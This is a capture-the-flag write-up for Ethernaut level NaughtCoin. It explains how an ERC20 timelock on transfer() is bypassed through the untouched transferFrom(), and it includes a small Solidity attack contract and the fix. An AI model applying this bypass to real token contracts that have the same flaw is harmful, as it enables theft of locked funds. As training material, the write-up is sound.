# Ethernaut #14 — NaughtCoin

## Vulnerability
`transfer()` is overridden with a `lockTokens` modifier enforcing a timelock, but `transferFrom()` (inherited from standard ERC20) is untouched. The timelock only blocks the direct-transfer path, not allowance-based transfers.

## Exploit
1. Player approves attack contract for full balance:
   `contract.approve(<attackAddress>, amount)`
2. Attack contract calls `transferFrom(player, attacker, amount)` — moves tokens out without ever touching `transfer()`, bypassing the lock entirely.

```solidity
contract attack {
    NaughtCoin target;
    constructor(NaughtCoin _target) {
        target = _target;
    }
    function attackContract() public {
        target.transferFrom(msg.sender, address(this), 1000000000000000000000000);
    }
}
```

## Fix
Override `transferFrom()` (and any other token-movement path) with the same timelock check, not just `transfer()`. Locking one function while leaving equivalent standard functions open defeats the purpose.

## Tools
Remix IDE (Injected Provider, Sepolia)
